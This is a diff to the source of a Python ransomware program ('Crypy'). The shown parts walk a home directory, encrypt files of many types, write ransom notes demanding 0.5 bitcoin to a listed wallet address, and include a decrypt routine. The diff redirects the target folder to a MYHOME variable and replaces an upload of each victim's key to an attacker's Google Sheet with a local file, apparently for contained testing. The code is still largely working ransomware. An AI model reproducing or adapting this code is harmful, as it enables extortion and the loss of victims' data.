@@ -63,7 +63,7 @@ def encrypt_all_files():
     # encrypt all files with following types
     password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))  # generate random password
     ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
-    for root, dirs, files in os.walk(os.getenv("HOME")):  # iterate from home
+    for root, dirs, files in os.walk(os.getenv("MYHOME")):  # iterate from home
         for filename in files:
             if filename.endswith(ext) and not filename.startswith("༼◕_◕༽"):  # pick only certain files and not enc ones
                 try:
@@ -79,28 +79,32 @@ def encrypt_all_files():
     message = "your file have been encrypted, to get them back transfer 0.5 bitcoins to our bitwallet address along with your unique id\n"
     bitwallet = "1HB5XMLmzFVj8ALj6mfBsbifRoD4miY36v"
     fullmessage = message + "\nbitwallet address: " + bitwallet + "\nyour unique username: " + random_username
-    with open(os.path.join(os.getenv("HOME") + "/Desktop", "Read me to get your files back!.txt"), 'w') as outfile:  # writes the file
+    with open(os.path.join(os.getenv("MYHOME") + "/Desktop", "Read me to get your files back!.txt"), 'w') as outfile:  # writes the file
         outfile.write(fullmessage)
-    with open(os.path.join(os.getenv("HOME") + "/Documents", "Read me to get your files back!.txt"), 'w') as outfile:  # writes the file
+    with open(os.path.join(os.getenv("MYHOME") + "/Documents", "Read me to get your files back!.txt"), 'w') as outfile:  # writes the file
         outfile.write(fullmessage)
-    with open(os.path.join(os.getenv("HOME") + "/Downloads", "Read me to get your files back!.txt"), 'w') as outfile:  # writes the file
+    with open(os.path.join(os.getenv("MYHOME") + "/Downloads", "Read me to get your files back!.txt"), 'w') as outfile:  # writes the file
         outfile.write(fullmessage)
-    with open(os.path.join(os.getenv("HOME") + "/", "username.txt"), 'w') as outfile:  # writes the file
+    with open(os.path.join(os.getenv("MYHOME") + "/", "username.txt"), 'w') as outfile:  # writes the file
         outfile.write(random_username)
 
     # use creds to interact with the Google Drive API - write username and password to sheet (for the attacker)
-    scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
-    creds = ServiceAccountCredentials.from_json_keyfile_name('googlesheet.json', scope)  # connect to json file
-    client = gspread.authorize(creds)
-    sheet = client.open("Crypy db").sheet1  # open the sheet
-    row = [random_username, password]  # put information: username and password
-    index = sheet.row_count  # put in last row and create new for next time
-    sheet.insert_row(row, index)  # insert to db
+    #scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
+    #creds = ServiceAccountCredentials.from_json_keyfile_name('googlesheet.json', scope)  # connect to json file
+    #client = gspread.authorize(creds)
+    #sheet = client.open("Crypy db").sheet1  # open the sheet
+    #row = [random_username, password]  # put information: username and password
+    #index = sheet.row_count  # put in last row and create new for next time
+    #sheet.insert_row(row, index)  # insert to db
+
+    # write the username and password into a file. 
+    with open("/home/hongda/recover.txt", "w") as outfile:
+        outfile.write(random_username + ", " + password)
 
 
 # decrypts all files when user gives correct password code, if not then the files are lost forever
 def decrypt_all_files(code):
-    for root, dirs, files in os.walk(os.getenv("HOME")):  # iterate from home
+    for root, dirs, files in os.walk(os.getenv("MYHOME")):  # iterate from home
         for filename in files:
             if filename.lower().startswith("༼◕_◕༽ "):  # checks if the file contains the encrypted symbol
                 try:
@@ -110,7 +114,7 @@ def decrypt_all_files(code):
                     os.remove(filepath)  # remove the encrypted file
                 except:
                     pass
-    filepath = os.path.join(os.getenv("HOME") + "/", "username.txt")
+    filepath = os.path.join(os.getenv("MYHOME") + "/", "username.txt")
     if os.path.exists(filepath):
         os.remove(filepath)  # remove id file if exists
 
@@ -242,7 +246,7 @@ class App2(QWidget):
 #                               ###################### main ######################
 random_username = ""
 flag = 0
-filepath = os.path.join(os.getenv("HOME") + "/", "username.txt")
+filepath = os.path.join(os.getenv("MYHOME") + "/", "username.txt")
 
 if os.path.exists(filepath):  # check if computer has already been encrypted
     with open(filepath, 'rb') as infile:  # opens the file
